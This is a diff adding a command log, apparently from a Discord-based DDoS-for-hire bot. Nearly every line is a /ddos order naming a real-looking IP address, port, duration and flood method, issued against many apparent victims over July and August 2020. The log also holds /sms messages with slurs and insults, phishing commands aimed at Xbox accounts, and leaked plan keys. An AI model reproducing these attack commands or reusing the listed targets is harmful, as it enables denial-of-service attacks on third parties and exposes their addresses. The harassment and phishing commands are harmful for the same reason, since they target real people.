@@ -1,0 +1,776 @@
+/getplan <@509066161778851872>
+/help
+/tr4p
+/ping 158.69.156.168
+/plam
+/plan
+/tr4p
+/plan
+/methods
+/ovh 158.69.156.168 60 61303
+/DDoS ovh 158.69.156.168 60 61303
+/DDoS ovh 158.69.156.168 60 dport=61303
+/methods
+/DDoS dns 216.49.34.57 10 dport=80
+/phishoptions
+/accounts
+/xboxcode
+/xboxcode
+/DDoS 1.1.1.1 ack 60 dport=80
+/getplan <@509066161778851872>
+/DDoS 158.69.156.168 ovh dport=80
+/DDoS ovh 158.69.156.168 60 dport=80
+/plan
+/methods
+/ddos udp 47.196.217.86 60 dport=80
+/ddos tcp 47.196.217.86 60 dport=80
+/stop
+/tr4p
+/ddos stop
+/lag
+/changeplan <@509066161778851872> 4
+/methods
+/ddos http 199.34.228.39 60 domain 199.34.228.39 conns=5000
+/ddos http 199.34.228.39 60 domain-199.34.228.39 conns=5000
+/ddos http 199.34.228.39 60 domain=443 conns=5000
+/ddos http 199.34.228.39 60 443 conns=5000
+/ddos 199.34.228.39 60 domain 443 conns=5000
+/ddos http 199.34.228.39 60 domain 443 conns=5000
+/methods
+/ddos stdhex 73.166.59.251 300 dport=80
+/ddos udp 73.166.59.251 100 dport=80
+/getplan <@509066161778851872>
+/plan
+/getplan
+/getplan
+/plan
+/getplan <@509066161778851872>
+/methods
+/getelite
+/clear 50
+/clear 50
+/clear 2
+/ddos ovh-smash 158.69.156.168 60 61303
+/ddos 158.69.156.168 60 61303
+/ddos udp 158.69.156.168 60 61303
+/ddos udp 158.69.156.168 61303
+/ddos udp 158.69.156.168 60 61303
+/methods
+/ddos udp 94.154.159.137 200 8080
+/ddos udpplain 94.154.159.137 200 8080
+/ddos http 94.154.159.137 200 94.154.159.137 5000
+/ddos http 94.154.159.137 200 8080 5000
+/stop
+/methods
+/ddos ovh-smash 94.154.159.137 94.154.159.137 120 8080
+/ddos ovh-smash 94.154.159.137 120 8080
+/ddos tcp 94.154.159.137 120 8080
+/ddos tcp 158.69.156.168 120 61303
+/ddos ovh-smash 158.69.156.168 120 61303
+/ddos udp 103.95.221.2 120 80
+/ddos udp 103.95.221.7 120 80
+/ddos ovh-smash 158.69.156.168 120 61303
+/ddos stdhex 158.69.156.168 120 61303
+/ddos 76.250.253.113 120 80
+/ddos udp 76.250.253.113 120 80
+/ddos udp 76.250.253.113 600 80
+/ddos udp 108.18.124.100 20 80
+/ddos stdhex 108.18.124.100 30 80
+/ddos stdhex 108.18.124.100 30 80
+/ddos stdhex 108.18.124.100 30 80
+/ddos stdhex 108.18.124.100 30 80
+/ddos
+/
+/sms
+/sms 15713147923
+/sms 5713147923 hi
+/sms 15713147923 hi
+/sms 911 how are you? My name is trapsquid
+/sms 5713147923 3
+/sms <@305921615282307083> HIIIII
+/sms <@!672652603880112148> retard
+/sms <@!693853122728296538> hey boi
+/sms <@!693853122728296538> boi
+/sms my ass bitch
+/plan
+/suckmydick I know your seeing this
+/plan <@672652603880112148>
+/getplan <@672652603880112148>
+/tr4p
+/
+/methods
+/admin
+/plans
+/
+/methods
+/ddos udp 208.95.112.1 60 50195
+/ddos UDP 208.95.112.1  80 50195
+/ddos TCP 208.95.112.1  80 50195
+/ddos stdhex 208.95.112.1 80 50195
+/ddos 208.95.112.1  stdhex 80 50195
+/ddos squid 208.95.112.1 80 50195
+/ddos
+/ddos 208.95.112.1  udp 208.95.112.1  80 50195
+/serverinfo
+/ddos godzilla udp 208.95.112.1  80 50195
+/ddos godzilla udp 208.95.112.1 80 80
+/
+/ddos godzilla 208.95.112.1 80 443
+/ddso godzilla udp 208.95.112.1 80 443
+/ddos godzilla 208.95.112.1 80 443
+/ddos godzilla udp 208.95.112.1 80 443
+/methods
+/ddos kraken squid 172.58.107.236 60 27284
+/ddos kraken squid 172.58.107.236 60 27284
+/stop
+/attackstop
+/stopattack
+/methods
+/ddos godzilla udp 116.202.168.122 60 100 19132
+/ddos godzilla tcp 116.202.168.122 60 19132
+/ddos godzilla udp 116.202.168.122 60 19132
+/ddos godzilla SYN 116.202.168.122 60 19132
+/ddos godzilla ACK 116.202.168.122 60 19132
+/ddos godzilla STD 116.202.168.122 60 19132
+/ddos godzilla XMAS 116.202.168.122 60 19132
+/ddos godzilla VSE 116.202.168.122 60 19132
+/ddos godzilla CNC 116.202.168.122 60 19132
+/ddos kraken udp 116.202.168.122 60 19132
+/ddos kraken ovh-smash116.202.168.122 60 19132
+/ddos kraken ovh-smash 116.202.168.122 60 19132
+/methods
+/ddos kraken nfo-down 116.202.168.122 60 19132
+/ddos kraken squid 116.202.168.122 100 19132
+/ddos kraken squid 116.202.168.122 60 19132
+/ddos kraken squid 116.202.168.122 100 19132
+/ddos kraken nfo-down 116.202.168.122 100 19132
+/ddos kraken squid 116.202.168.122 150 19132
+/ddos kraken nfo-down 116.202.168.122 150 19132
+/ddos kraken squid 116.202.168.122 150 19132
+/ddos kraken squid 116.202.168.122 150 19132
+/ddos kraken nfo-down 116.202.168.122 150 19132
+/ddos kraken nfo-down 116.202.168.122 150 19132
+/ddos kraken nfo-down 116.202.168.122 150 19132
+/ddos kraken nfo-down 116.202.168.122 150 19132
+/ddos kraken squid 116.202.168.122 150 19132
+/ddos kraken squid 116.202.168.122 150 19132
+/ddos kraken nfo-down 116.202.168.122 150 19132
+/ddos kraken udp 116.202.168.122 150 19132
+/methods
+/ddos godzilla udp 116.202.168.122 150 19132
+/ddos kraken ack 116.202.168.122 150 19132
+/ddos kraken squid 116.202.168.122 150 19132
+/ddos kraken nfo-down 116.202.168.122 150 19132
+/ddos kraken nfo-down 116.202.168.122 1500 19132
+/ddos kraken squid 116.202.168.122 1500 19132
+/plan
+/ddos kraken squid 95.217.149.161 1500 19132
+/ddos kraken nfo-down 95.217.149.161 1500 19132
+/ddos kraken squid 95.217.149.161 150 80
+/ddos kraken nfo-down 95.217.149.161 300 80
+/methods
+/ddos godzilla UDP 95.217.149.161 300 80
+/ddos godzilla TCP 95.217.149.161 300 80
+/methods
+/ddos kraken vse 172.58.107.236 60 80
+/ddos kraken ack 172.58.107.236 60 80
+/ddos kraken syn 172.58.107.236 60 80
+/ddos kraken nfo-down 172.58.107.236 60 80
+/ddos kraken squid 172.58.107.236 60 80
+/ddos kraken squid 172.58.107.236 120 80
+/ddos kraken squid 172.58.107.236 39290
+/ddos kraken squid 172.58.107.236 120 39290
+/eatmyass
+/eatmyass
+/terminal
+/getplan <@391500589986742272> 2
+/terminal
+/add bots 100
+/bots
+/ddos kraken nfo-down 95.217.149.161 300 80
+/ddos kraken nfo-down 95.217.149.161 300 19132
+/ddos kraken squid 95.217.149.161 300 80
+/ddos kraken nfo-down 95.217.149.161 300 80
+/phish xbox
+/plan <@355871581752524801>
+/getplan <@355871581752524801>
+/invite
+/prices
+/plans
+/plans
+/plans
+/plans
+/plans
+/getplan <@305921615282307083>
+/increaseplan <@!509066161778851872> 10y
+/increaseplan <@305921615282307083> 10d
+/plans
+/nmap 185.141.207.189
+/nmapresult
+/nmapresult
+/nmapresilts
+/nmapresults
+/nmapresult
+/methods
+/ddos squid 185.141.207.189 300 22
+/ddos kraken squid 185.141.207.189 300 443
+/ddos kraken squid 185.141.207.189 300 22
+/ddos kraken nfo-down 185.141.207.189 300 443
+/ddos kraken squid 185.141.207.189 300 22
+/checkip 158.69.156.168
+/
+/sms
+/ddos kraken squid 52.224.248.204 80 30205
+/ddos kraken udp 52.224.248.204 100 30205
+/methods
+/ddos kraken tcp 52.224.248.204 60 30205
+/server
+/checkserver
+/checkservers
+/methods
+/ddos kraken syn 52.224.248.204 30 30205
+/ddos kraken std 52.224.248.204 60 30205
+/ddos kraken std 52.224.248.204 60 30205
+/ddos kraken std 52.224.248.204 60 30205
+/ddos kraken std 52.224.248.204 60 30205
+/methods
+/
+/claim key
+/claim key
+/
+/methods
+/ddos kraken vse 54.236.7.105 80 9002
+/ddos kraken std 54.236.7.105 80 9002
+/ddos kraken vse 54.236.7.105 80 9002
+/ddos kraken std 54.236.7.105 80 9002
+/ddos kraken std 54.236.7.105 80 9002
+/ddos kraken std 54.236.7.105 80 9002
+/ddos kraken std 54.236.7.105 300 9002
+/ddos kraken udpplain 35.173.251.21 10 9007
+/ddos kraken udpplain 35.173.251.21 05 9007
+/ddos kraken udpplain 35.173.251.21 10 9007
+/ddos kraken udpplain 35.173.251.21 60 9007
+/ddos kraken udpplain 35.173.251.21 120 9007
+/ddos kraken udpplain 35.173.251.21 10 9007
+/ddos kraken udpplain 35.173.251.21 300 9007
+/ddos kraken udpplain 52.191.36.191 10 39704
+/ddos kraken stdhex 52.191.36.191 10 39704
+/ddos kraken std 52.191.36.191 10 39704
+/ddos kraken std 52.191.36.191 20 39704
+/ddos karen ddos std 104.200.145.46 20 33640
+/ddos kraken std 104.200.145.46 20 33640
+/ddos kraken std 96.30.201.39 20 42870
+/ddos kraken std 96.30.201.39 50 42870
+/ddos kraken udpplain 96.30.201.39 20 42870
+/ddos kraken std 96.30.201.39 20 42870
+/ddos kraken udpplain 96.30.201.39 20 42870
+/ddos kraken std 3.93.62.24 10 9050
+/ddos kraken std 3.93.62.24 10 9050
+/ddos kraken std 3.93.62.24 10 9050
+/ddos kraken std 3.93.62.24 10 9050
+/ddos kraken std 3.93.62.24 60 9050
+/ddos kraken std 3.93.62.24 10 9050
+/ddos kraken std 3.93.62.24 300 9050
+/ddos kraken udp 68.114.221.115 30 80
+/ddos kraken squid 68.114.221.115 30 80
+/ddos kraken udp 68.114.221.115 30 80
+/whymyshit notworking
+/ddos kraken squid 68.114.221.115 30 80
+/ddos kraken squid 68.114.221.115 40 80
+/methods
+//ddos kraken std 68.114.221.115 30 80
+/ddos kraken std 68.114.221.115 30 80
+/ddos kraken udpplain 68.114.221.115 40 80
+/ddos kraken udpplain 68.114.221.115 30 80
+/ddos kraken udpplain 68.114.221.115 50 80
+/ddos kraken tcp 68.114.221.115 50 80
+/reboot
+/reboot
+/admin
+/admin
+/increaseplan <@672652603880112148>
+/plan
+/plans
+/plans
+/plans
+/plans
+/plans
+/plans
+/plans
+/plans
+/plans
+/plans
+/plans
+/checkip There 96.228.36.116
+/checkip 96.228.36.116
+/ddos kraken ovh-smash 192.99.226.9 100 22
+/ddos kraken std 192.99.226.9 100 22
+/ddos kraken udpplain 192.99.226.9 100 22
+/methods
+/ddos kraken tcp 192.99.226.9 100 22
+/ddos kraken ack 192.99.226.9 100 22
+/ddos kraken udpplain 68.32.181.227 200 51
+/ddos kraken udpplain 51.75.120.80 100 443
+/ddos kraken ovh-smash 51.75.120.80 100 443
+/ddos kraken udpplain 89.205.227.51 100 80
+/ddos kraken udpplain 172.58.107.175 60 64682
+/ddos kraken std 172.58.107.175 60 64682
+/ddos kraken std 52.224.90.75 100 30106
+/ddos kraken udpplain 24.184.222.4 80 51
+/ddos kraken std 52.224.90.75 200 30106
+/ddos kraken std 52.224.90.75 120 30106
+/ddos kraken udpplain 52.224.90.75 30 30106
+/ddos kraken std 52.224.90.75 120 30106
+/servers
+/serverinfo
+/checkservers
+/ddos kraken std 52.224.90.75 120 30106
+/ddos kraken std 40.124.105.138 120 30022
+/ddos kraken std 40.124.105.138 10 30022
+/ddos kraken std 40.124.105.138 5 30022
+/ddos kraken std 40.124.105.138 120 30022
+/ddos kraken udpplain 40.124.105.138 120 30022
+/ddos kraken std 40.124.105.138 120 30022
+/ddos kraken udpplain 40.124.105.138 120 30022
+/ddos kraken udpplain 40.124.105.138 120 30047
+/ddos kraken udpplain 40.124.98.201 120 30047
+/ddos kraken std 40.124.98.201 120 30047
+/ddos kraken std 40.124.98.201 120 30105
+/ddos kraken udpplain 40.124.98.201 120 30105
+/ddps kraken std 96.241.42.229 120 80
+/ddos kraken std 96.241.42.229 30 80
+/ddos kraken udpplain 96.241.42.229 40 80
+/methods
+/ddos kraken squid 96.241.42.229 30 80
+/ddos kraken udp 96.241.42.229 60 80
+/ddos kraken udpplain 96.241.42.229 60 80
+/ddos kraken std 96.241.42.229 60 80
+/ddos kraken tcp 96.241.42.229 60 80
+/ddos kraken udpplain 40.124.106.35 120 80
+/ddos kraken udpplain 40.124.106.35 120 36000
+/ddos kraken udpplain 40.124.106.35 120 36800
+/ddos kraken std 40.119.33.22 120 30126
+/checkservers
+/ddos kraken udpplain 40.119.33.22 120 30126
+/plan
+/ddos kraken std 40.119.33.22 60 30126
+/ddos kraken udpplain 40.119.33.22 120 30126
+/ddos kraken squid 40.119.33.22 120 30126
+/methods
+/current servers
+/currentservers
+/checkservers
+/ddos kraken udpplain 68.205.139.55 80 80
+/ddos kraken squid 68.205.139.55 80 80
+/ddos kraken squid 187.152.240.212 80 80
+/ddos kraken udpplain 87.152.240.212 80 80
+/ddos kraken std 187.152.240.212 80 80
+/ddos kraken std 104.45.182.195 80 30126
+/ddos kraken udpplain 172.58.107.175 80 64682
+/ddos kraken squid 172.58.107.175 80 64682
+/ddos kraken udpplain 172.58.107.175 80 64682
+/ddos kraken std 172.58.107.175 80 64682
+/ddos kraken squid 172.58.107.175 80 64682
+/ddos kraken racist Tyler 60 80
+/checkservers
+/checkservers
+/methods
+/ddos kraken std 78.46.155.238 120 80
+/plan
+/plan
+/
+/tr4p
+/getplan <@346055270184648704>
+/ddos kraken udpplan 173.61.177.206 80 51
+/methods
+/ddos kraken udpplan 173.61.177.206 80 51
+/ddos kraken squid 173.61.177.206 80 51
+/ddos kraken udp 173.61.177.206 80 51
+/ddos kraken std 173.61.177.206 80 51
+/ddos kraken std 173.61.177.206 80 80
+/checkservers
+/ddos kraken squid 173.61.177.206 80 51
+/ddos kraken udp 173.61.177.206 80 51
+/ddos kraken std 173.61.177.206 80 51
+/ddos squid 172.58.107.133 80 36116
+/ddos kraken squid 172.58.107.133 80 36116
+/ddos kraken std 172.58.107.133 80 36116
+/ddos kraken udp 172.58.107.133 80 36116
+/checkservers
+/methods
+/ddos godzilla udp 172.58.107.133 80 36116
+/ddos godzilla tcp172.58.107.133 80 36116
+/ddos godzilla tcp 172.58.107.133 80 36116
+/ddos godzilla tcp 172.58.107.133 80 36116
+/ddos godzilla udp 172.58.107.133 80 36116
+/ddos godzilla std 172.58.107.133 300 36116
+/ddos godzilla xmas 172.58.107.133 80 36116
+/ddos godzilla xmas 172.58.107.133 50036116
+/ddos godzilla xmas 172.58.107.133 500 36116
+/ddos godzilla std 172.58.107.133 500 36116
+/ddos godzilla udp 172.58.107.133 500 36116
+/ddos godzilla xmas 172.58.107.133 12036116
+/ddos godzilla xmas 172.58.107.133 120 36116
+/checkservers
+/ddos godzilla 172.58.143.89 80 80
+/ddos godzilla std 172.58.143.89 80 80
+/ddos godzilla xmas 172.58.143.89 80 80
+/ddos godzilla udp 172.58.143.89 80 80
+/methods
+/checkservers
+/checkservers
+/dstat
+/methods
+/ddos kraken udpplain 158.69.156,168 80 80
+/ddos kraken udpplain 158.69.156.168 80 80
+/getplan <@!712948491084628020>
+/plan
+/methods
+/ddos Godzilla CUDP 156.69.158.168 40 80 2 10 1 0
+/methods
+/ddos kraken udpplain 174.223.1.187 40 80
+/ddos kraken udpplain 174.223.1.187 40 8626
+/ddos kraken squid 174.223.1.187 40 8626
+/ddos kraken std 174.223.1.187 40 8626
+/ddos kraken std 96.241.42.229 20 80
+/ddos kraken std 96.241.42.229 20 3074
+/ddos kraken udp 96.241.42.229 40 3074
+/ddos kraken udpplain  96.241.42.229 40 3074
+/ddos kraken udp 96.241.42.229 40 3074
+/ddos kraken squid 96.241.42.229 40 3074
+/checkservers
+/ddos kraken std 96.241.42.229 40 3074
+/ddos kraken std 96.241.42.229 40 80
+/ddos kraken squid 96.241.42.229 40 80
+/ddos kraken udpplain 96.241.42.229 40 80
+/ddos kraken squid 96.241.42.229 40 3074
+/ddos kraken std 96.241.42.229 40 3074
+/ddos kraken udplplain 96.241.42.229 40 3074
+/ddos kraken udpplain 96.241.42.229 40 3074
+/methods
+/ddos kraken vse 96.241.42.229 80 3974
+/ddos kraken vse 96.241.42.229 40 3074
+/ddos kraken vse 96.241.42.229 40 80
+/ddos kraken squid 96.241.42.229 80 80
+/checkservers
+/ddos kraken udpplain 96.241.42.229 80 80
+/ddos kraken std 96.241.42.229 80 80
+/ddos kraken squid 158.69.156.168 80 80
+/ddos kraken ovh-smash 158.69.156.168 100 80
+/ddos kraken 158.69.156.69 80 80
+/ddos kraken udpplain 158,69,156.168 80 80
+/ddos kraken squid 158.69.156.168 80 80
+/ddos kraken std 96.241.42.229 80 80
+/ddos godzilla std 52.224.75.246 80 30216
+/ddos godzilla vse 52.224.249.21 80 30028
+/methods
+/ddos godzilla std 30 30242
+/ddos godzilla std 52.224.135.29 30 30242
+/ddos godzilla udp 52.224.135.29 30 30242
+/ddos godzilla xmas 52.224.135.29 30 30242
+/lag
+/lag udp 52.224.135.29 1 30 10 30242
+/plans
+/ddos godzilla VSE 3.87.42.141 30 9002
+/ddos godzilla std 3.87.42.141 30 9002
+/methods
+/ddos godzilla udpplain 3.87.42.141 30 9002
+/ddos godzilla udpplain 3.87.42.141 30 9002
+/ddos godzilla xmas 3.87.42.141 30 9002
+/ddos godzilla udp 3.87.42.141 30 9002
+/ddos godzilla std 3.87.42.141 30 9002
+/ddos godzilla udp 3.87.42.141 30 9002
+/ddos godzilla VSE 3.87.42.141 15 9002
+/ddos godzilla VSE 3.87.42.141 30 9002
+/ddos godzilla VSE 3.87.42.141 15 9002
+/methods
+/tr4p
+/checkip 86.26.235.232
+/checkip 96.241.42.229
+/methods
+/ddos kraken squid 68.36.201.8 200 80
+/ddos godzilla VSE 45.63.46.58 120 39790
+/
+/claim KEY
+/claim keyTRIwWb2ZcbHAtDtkZYlyba9oS6dyMBela8zyZTipKOblvsrDNE
+/claim key TRIwWb2ZcbHAtDtkZYlyba9oS6dyMBela8zyZTipKOblvsrDNE
+/claim key TRIwWb2ZcbHAtDtkZYlyba9oS6dyMBela8zyZTipKOblvsrDNE
+/claim key
+/getplan <@716097174110339114>
+/claim key
+/
+/claim KEY
+/ddos godzilla VSE 52.143.241.200 20 30007
+/ddos godzilla VSE 52.143.251.29 40 30015
+/ddos kraken squid 172.58.107.150 180 45040
+/ddos kraken VSE 172.58.107.150 180 45040
+/methods
+/ddos kraken squid 199.126.156.107 200 80
+/ddos kraken squid 199.126.156.107 200 80
+/ddos kraken VSE 199.126.156.107 200 80
+/ddos kraken VSE 199.126.156.107 200 80
+/checkservers
+/checkservers
+/ddos godzilla VSE 137.186.218.54 50320
+/ddos godzilla VSE 137.186.218.54 50320
+/ddos godzilla VSE 137.186.218.54 30 50320
+/ddos godzilla VSE 137.186.218.54 30 50320
+/getplan <@716097174110339114>
+/ddos kraken UDP 72.88.144.41 80 20
+/methods
+/ddos kraken squid 52.144.101.66 1800 80
+/ping 166.173.59.115
+/ddos kraken squid 166.173.59.115 55868
+/ddos kraken squid 166.173.59.115 1800 55868
+/ddos kraken STD 166.173.59.115 1800 55868
+/getplan <@716097174110339114>
+/plans
+/checkip 51.222.33.62
+/
+/ddos squid 51.222.33.62 300 54972
+/ddos kraken squid 51.222.33.62 300 54972
+/checkip 51.222.33.62
+/
+/tr4-
+/checkip 51.222.33.62
+/checkip 51.222.33.62
+/checkip 1.1.1.1
+/checkip 158.69.156.168
+/plans
+/ddos godzilla VSE 52.191.88.55 120 30147
+/ddos godzilla VSE 52.191.88.55 120 30147
+/ddos godzilla STD 52.191.88.55 120 30147
+/ddos kraken udp 104.207.133.242 30 80
+/ddos kraken udpplain 104.207.133.242 30 80
+/ddos kraken squid 104.207.133.242 30 80
+/ddos kraken ovh-down104.207.133.242 30 80
+/ddos kraken ovh-smash 104.207.133.242 30 80
+/ddos kraken ovh-smash 104.207.133.242 30 80
+/ddos kraken std 104.207.133.242 30 80
+/ddos kraken squid 104.207.133.242 30 80
+/ddos kraken squid 24.154.195.148 40 80
+/ddos kraken squid 24.154.195.148 60 80
+/ddos kraken STD 24.154.195.148 40 80
+/bots
+/plan
+/ddos godzilla VSE 128.116.75.173 40 52122
+/ddos godzilla VSE 128.116.75.173 40 52122
+/ddos godzilla VSE 128.116.25.36 80 62161
+/ddos godzilla VSE 128.116.25.36 80 54618
+/claim KEY 123123123
+/ddos kraken squid 73.109.24.248 80 300
+/ddos kraken std 73.109.24.248 80 300
+/ddos kraken udpplain 73.109.24.248 80 300
+/ddos kraken VSE 73.109.24.248 80 300
+/ddos godzilla VSE 73.109.24.248 80 300
+/ddos godzilla VSE 73.109.24.248 51 300
+/ddos kraken VSE 73.109.24.248 80 300
+/ddos Kraken squid 73.109.24.248 51 300
+/ddos kraken squid 82.45.231.85 51 300
+/plan
+/ddos kraken Squid 158.69.156.168 80 80
+/getplan
+/plan
+/ddos kraken squid <@698451241667133502> 51 80
+/checkip 158,68.156.168
+/claim TRz2Ohuf7e2bS63jCIo42wV2S0YTferBekBQIWW7tTUpblDZiw
+/ddos kraken squid 68.205.139.55 100 80
+/tr4p
+/info
+/creator
+/servers
+/methods
+/ddos kraken http 83.138.80.81 120 hostnet.de
+/ddos kraken squid 83.138.80.81 120 80
+/ddos kraken squid 83.138.80.81 120 443
+/ddos kraken squid 83.138.80.81 120 80
+/ddos kraken squid 187.188.64.188 120 80
+/ddos kraken vse 187.188.64.188 120 80
+/ddos kraken udpplain 187.188.64.188 120 80
+/sms
+/ddos kraken squid 96.241.42.229 40 80
+/ddos kraken std 96.241.42.229 40 80
+/ddos kraken udpplain 96.241.42.229 40 80
+/methods
+/ddos kraken squid 96.241.42.229 60 80
+/ddos kraken vse 96.241.42.229 60 80
+/ddos kraken vse 96.241.42.229 60 80
+/ddos kraken udpplain 96.241.42.229 60 80
+/ddos godzilla vse 96.241.42.229 40 80
+/checkservers
+/checkserver
+/checkservers
+/ddos godzilla vse 166.177.123.203 300 30688
+/ddos godzilla vse 166.177.123.203 300 30688
+/ddos kraken squid 172.58.110.171 120 36622
+/ddos godzilla vse 172.58.110.171 120 36622
+/ddos godzilla vse 96.241.42.229 10 80
+/ddos godzilla vse 96.241.42.229 15 80
+/ddos godzilla vse 96.241.42.229 20 80
+/ddos godzilla vse 96.241.42.229 30 80
+/ddos godzilla vse 128.116.63.75 120 63752
+/checkip 128.116.63.75
+/ddos Godzilla VSE 156.69.156.168
+/ddos Godzilla VSE 156.69.156.168 20 80
+/ddos Godzilla VSE 156.69.156.168 20 80
+/methods
+/ddos Godzilla VSE 158.69.156.168 10 80
+[Wed Jul 29 2020 09:29:00 GMT-1100 (Samoa Standard Time)] /getplan <@469284720606314496>
+[Wed Jul 29 2020 12:06:22 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 24.184.166.3 9800 80
+[Wed Jul 29 2020 14:30:51 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 24.28.156.32 51 3600
+[Wed Jul 29 2020 14:32:19 GMT-1100 (Samoa Standard Time)] /checkservers
+[Wed Jul 29 2020 14:33:03 GMT-1100 (Samoa Standard Time)] /ddos kraken vse 24.28.156.32 51 3600
+[Wed Jul 29 2020 14:33:32 GMT-1100 (Samoa Standard Time)] /methods
+[Wed Jul 29 2020 14:34:11 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 24.28.156.32 51 3600
+[Wed Jul 29 2020 14:36:00 GMT-1100 (Samoa Standard Time)] /ddos kraken std 24.28.156.32 51 3600
+[Wed Jul 29 2020 14:36:50 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain 24.28.156.32 51 3600
+[Wed Jul 29 2020 14:41:50 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 24.28.156.32 51 3600
+[Wed Jul 29 2020 14:41:57 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain 24.28.156.32 51 3600
+[Wed Jul 29 2020 14:42:10 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain 24.28.156.32 51 3600
+[Thu Jul 30 2020 11:44:44 GMT-1100 (Samoa Standard Time)] /checkservers
+[Thu Jul 30 2020 11:45:54 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 24.28.156.32 51 3600
+[Thu Jul 30 2020 11:47:23 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain 24.28.156.32 51 360
+[Thu Jul 30 2020 11:51:57 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 24.28.156.32 80 360
+[Thu Jul 30 2020 12:19:37 GMT-1100 (Samoa Standard Time)] /ddos kraken 172.58.110.171 120 56862
+[Thu Jul 30 2020 12:19:52 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 172.58.110.171 120 56862
+[Fri Jul 31 2020 13:08:22 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 69.206.5.5 80 80
+[Fri Jul 31 2020 13:08:33 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain 69.206.5.5 80 80
+[Fri Jul 31 2020 13:13:25 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 69.206.5.5 80 500
+[Fri Jul 31 2020 13:13:55 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 69.206.5.5 80 500
+[Fri Jul 31 2020 13:55:04 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 174.66.1.169 80 420
+[Fri Jul 31 2020 13:55:35 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain 174.66.1.169 80 420
+[Fri Jul 31 2020 15:59:51 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 74.187.161.93 80 300
+[Fri Jul 31 2020 16:01:28 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 24.154.195.148 80 300
+[Fri Jul 31 2020 16:05:58 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 74.187.161.93 80 300
+[Fri Jul 31 2020 16:06:05 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain74.187.161.93 80 300
+[Fri Jul 31 2020 16:06:09 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain 74.187.161.93 80 300
+[Fri Jul 31 2020 16:13:40 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 3.237.142.120 80 9007
+[Fri Jul 31 2020 16:17:46 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 3.237.137.94 40 9065
+[Fri Jul 31 2020 16:18:26 GMT-1100 (Samoa Standard Time)] /ddos godzilla std 3.237.137.94 40 9065
+[Fri Jul 31 2020 16:18:57 GMT-1100 (Samoa Standard Time)] /ddos kraken vse 3.237.137.94 40 9065
+[Fri Jul 31 2020 17:41:01 GMT-1100 (Samoa Standard Time)] /plan
+[Sat Aug 01 2020 07:12:11 GMT-1100 (Samoa Standard Time)] /plan
+[Sat Aug 01 2020 13:19:08 GMT-1100 (Samoa Standard Time)] /getplan <@!346068396233981952>
+[Sat Aug 01 2020 14:29:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 72.191.101.63 80 9065
+[Sat Aug 01 2020 14:30:50 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 72.191.101.63 120 80
+[Sat Aug 01 2020 15:46:42 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 98.210.220.88 80 80
+[Sat Aug 01 2020 15:47:12 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain 98.210.220.88 80 80
+[Sat Aug 01 2020 15:47:46 GMT-1100 (Samoa Standard Time)] /ddos kraken vse 98.210.220.88 80 80
+[Sat Aug 01 2020 15:49:09 GMT-1100 (Samoa Standard Time)] /plan
+[Sat Aug 01 2020 15:49:44 GMT-1100 (Samoa Standard Time)] /ddos godzilla 98.210.220.88 vse 80 80
+[Sat Aug 01 2020 15:49:57 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 98.210.220.88 80 80
+[Sat Aug 01 2020 15:52:17 GMT-1100 (Samoa Standard Time)] /methods
+[Sat Aug 01 2020 15:52:31 GMT-1100 (Samoa Standard Time)] /ddos kraken std 98.210.220.88 80 80
+[Sat Aug 01 2020 15:53:00 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 98.210.220.88 80 80
+[Sat Aug 01 2020 15:58:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 67.162.128.32 80 80
+[Sat Aug 01 2020 15:59:37 GMT-1100 (Samoa Standard Time)] /sio
+[Sat Aug 01 2020 15:59:39 GMT-1100 (Samoa Standard Time)] /stop
+[Sat Aug 01 2020 15:59:41 GMT-1100 (Samoa Standard Time)] /stop
+[Sat Aug 01 2020 15:59:42 GMT-1100 (Samoa Standard Time)] /stop
+[Sat Aug 01 2020 16:29:18 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 71.73.78.121 80 80
+[Sat Aug 01 2020 16:31:05 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 75.185.72.111 80 80
+[Sat Aug 01 2020 16:47:25 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 74.101.175.31 300 80
+[Sun Aug 02 2020 11:46:22 GMT-1100 (Samoa Standard Time)] /methods
+[Sun Aug 02 2020 11:47:04 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh-smash 66.70.179.99 300 22
+[Sun Aug 02 2020 11:47:22 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.70.179.99 120 22
+[Sun Aug 02 2020 11:47:33 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh-smash 66.70.179.99 300 22
+[Sun Aug 02 2020 11:47:51 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 66.70.179.99 120 22
+[Sun Aug 02 2020 11:50:22 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh-smash 66.70.179.99 120 22
+[Sun Aug 02 2020 15:04:57 GMT-1100 (Samoa Standard Time)] /help
+[Sun Aug 02 2020 15:05:11 GMT-1100 (Samoa Standard Time)] /giphy
+[Sun Aug 02 2020 15:05:23 GMT-1100 (Samoa Standard Time)] /clear 4
